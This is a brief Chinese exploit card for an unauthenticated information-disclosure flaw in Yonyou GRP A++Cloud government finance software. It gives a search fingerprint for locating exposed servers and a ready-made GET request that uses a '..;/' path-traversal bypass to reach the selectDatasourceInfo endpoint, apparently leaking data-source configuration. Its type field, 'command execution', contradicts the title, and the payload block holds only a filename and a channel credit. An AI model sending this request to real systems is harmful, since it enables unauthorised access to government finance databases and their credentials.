# 用友GRPA++Cloud政府财务云selectDatasourceInfo存在信息泄漏漏洞

- **系统**：用友　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`web.body="/pf/portal/login/css/fonts/style.css"`
- **请求**：`GET /pub/fe/config/..;/..;/..;/gla/dataSource/selectDatasourceInfo HTTP/1.1`
- **关键头**：`Cookie: JSESSIONID=826FC7558B8D4ECA81250491A893FF90`　`If-Modified-Since: Tue, 25 Feb 2020 19:33:38 GMT`　`If-None-Match: W/"7381-1582659218000"`

**请求体 / payload**
```
\[用友A++-selectdatasourceinfo-未授权.yaml]\(公众号：渗透安全HackTwo
```

**其他**
- 用友GRP A++Cloud政府财务云selectDatasourceInfo存在信息泄漏漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 用友GRP A++Cloud政府财务云